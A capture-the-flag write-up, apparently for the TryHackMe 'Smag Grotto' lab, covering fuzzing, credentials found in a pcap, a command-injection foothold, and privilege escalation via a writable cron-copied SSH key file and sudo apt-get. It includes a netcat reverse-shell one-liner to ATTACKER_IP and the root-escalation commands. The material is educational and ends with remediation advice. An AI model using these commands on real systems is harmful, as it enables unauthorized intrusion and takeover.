@@ -1,0 +1,89 @@
+Smag Grotto — TryHackMe Write-Up 🏴‍☠️
+
+
+Port	Service	Version
+22	SSH	OpenSSH 7.2p2
+80	HTTP	Apache httpd 2.4.18
+🌐 Web Enumeration
+Directory Fuzzing
+bash
+
+ffuf -u http://10.10.X.X/FUZZ -w /usr/share/wordlists/dirb/common.txt
+Interesting Finding: /mail/ directory containing a .pcap file.
+
+📡 Network Traffic Analysis
+Opened the captured .pcap file in Wireshark and analyzed HTTP traffic.
+Discovered Credentials
+
+Field	Value
+Subdomain	development.smag.thm
+Username	helpdesk
+Password	cH4nG3M3_n0w
+💡 Added development.smag.thm to /etc/hosts
+
+🚪 Initial Access
+Command Injection
+Logged into http://development.smag.thm/login.php and discovered a command injection vulnerability in the admin panel.
+Reverse Shell Payload:
+bash
+
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
+Listener:
+bash
+
+nc -lvnp 4444
+✅ Shell obtained as www-data
+
+🔐 Privilege Escalation: www-data → jake
+Enumeration
+Discovered a cron job running every minute:
+bash
+
+cat /etc/crontab
+
+* * * * * root /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
+Exploitation
+The backup file was world-writable! Injected my SSH public key:
+bash
+
+echo 'ssh-rsa AAAA...[MY_PUBLIC_KEY]...' >> /opt/.backups/jake_id_rsa.pub.backup
+After 1 minute, connected via SSH:
+bash
+
+ssh jake@10.10.X.X
+✅ User flag obtained!
+
+👑 Privilege Escalation: jake → root
+Sudo Enumeration
+bash
+
+sudo -l
+
+User jake may run the following commands on smag:    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
+GTFOBins Exploitation
+bash
+
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
+✅ Root shell obtained!
+bash
+
+cat /root/root.txt
+🏆 Root flag captured!
+
+🎯 Key Takeaways
+* Network forensics can reveal sensitive credentials
+* Cron jobs with writable files are dangerous
+* Sudo misconfigurations can lead to full system compromise
+* Always check GTFOBins for privilege escalation vectors
+
+🛡️ Remediation Recommendations
+1. Never transmit credentials over unencrypted HTTP
+2. Restrict file permissions on backup files
+3. Limit sudo privileges to essential commands only
+4. Sanitize user input to prevent command injection
+
+📚 Tools Used
+* Nmap
+* ffuf
+* Wireshark
+* Netcat
